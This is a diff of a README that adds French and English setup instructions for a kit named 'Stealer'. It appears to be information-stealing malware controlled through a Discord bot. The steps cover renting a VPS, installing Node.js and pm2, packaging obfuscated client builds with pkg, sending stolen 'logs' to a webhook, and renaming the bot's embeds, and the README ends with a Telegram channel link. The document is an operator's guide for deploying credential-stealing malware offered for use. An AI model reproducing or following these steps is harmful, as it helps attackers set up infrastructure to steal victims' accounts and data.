@@ -1,3 +1,5 @@
+french
+
 Use Vps with Ubuntu 20.04 (i prefer https://rdp.sh/ 10$ server per month in amsterdam)
 
 Download Node v18.16.1:
@@ -18,6 +20,37 @@ Changer vos directories dans Stealer/Bot/index.js et mettez les nouvelles (ex: /
 Pour modifier le nom des logs allez dans Stealer/ClientObf/Utils dans discord.js Modifier les émojis et le nom et dans stats.js c'est de même.
 
 Pour modifier le nom des embeds de build allez dans Stealer/Bot et dans index.js vous pouvez renammes le bot ^^
+
+/build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
+
+official 1336 Channel
+https://t.me/St34ler
+
+
+-----------------------------------------------------------------------
+English
+
+
+Use Vps with Ubuntu 20.04 (i prefer https://rdp.sh/ 10$ server per month in amsterdam)
+
+Download Node v18.16.1:
+- sudo apt update
+- sudo apt install curl
+- curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+- sudo apt install -y nodejs
+
+
+Setup the src on your vps
+
+- sudo npm install
+- sudo npm i pm2 -g
+- sudo npm install -g pkg
+
+Change your directories in Stealer/Bot/index.js and put the new ones (ex: /home/vshell/ClientObf/link.txt your vps name is lolita, then this will do /home/lolita/ClientObf/link.txt)
+
+To modify the name of the logs go to Stealer/ClientObf/Utils in discord.js Modify emojis and name and in stats.js it's the same.
+
+To modify the name of the build embeds go to Stealer/Bot and in index.js you can rename the bot ^^
 
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
 
